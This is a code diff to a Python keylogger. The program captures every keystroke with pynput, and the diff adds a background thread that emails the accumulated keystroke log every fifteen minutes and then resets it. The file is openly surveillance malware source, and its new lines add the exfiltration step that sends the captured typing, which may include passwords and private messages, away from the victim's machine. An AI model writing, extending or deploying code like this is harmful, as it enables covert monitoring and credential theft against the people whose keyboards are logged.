@@ -1,12 +1,14 @@
 from pynput.keyboard import Listener
 from mailservice import send_mail
+from threading import Thread
+from time import sleep
 
 
 logString = ""
 inputCounter = 0
 
 def key_formatter(inputString):
-    """A simple function that polishes the input characters before they get added to the logfile"""
+    """A simple function that polishes the input characters before they get added to the logfile."""
 
     # Any misc key needs to be ignored or adjusted properly before being added to the logfile
     # Shift is not needed - the library automatically turns the specified letter in uppercase
@@ -61,7 +63,7 @@ def key_formatter(inputString):
 
 
 def log_keystroke(key):
-    """This is the logging function: every keyboard input is read and added to the logfile"""
+    """This is the logging function: every keyboard input is read and added to the logfile."""
     global logString
     global inputCounter
     
@@ -80,7 +82,22 @@ def log_keystroke(key):
     logString = logString + inputString
     inputCounter = inputCounter + 1
 
+def log_timer():
+    """This function is used to send emails every 900 seconds."""
+    global logString
+    while True:
+        sleep(900) # sleep for 15minutes before sending any emails
+        send_mail(logString)
+        logString = "" # after sending, reset the logstring
+
+
+# start the thread that sends email every x seconds
+thread = Thread(target = log_timer)
+thread.start()
+
 # The "with" keyword will automatically close the listener.
 # It always makes sure that the memory allocated to it will be released, no matter what.
 with Listener(on_press=log_keystroke) as l:
     l.join()
+
+
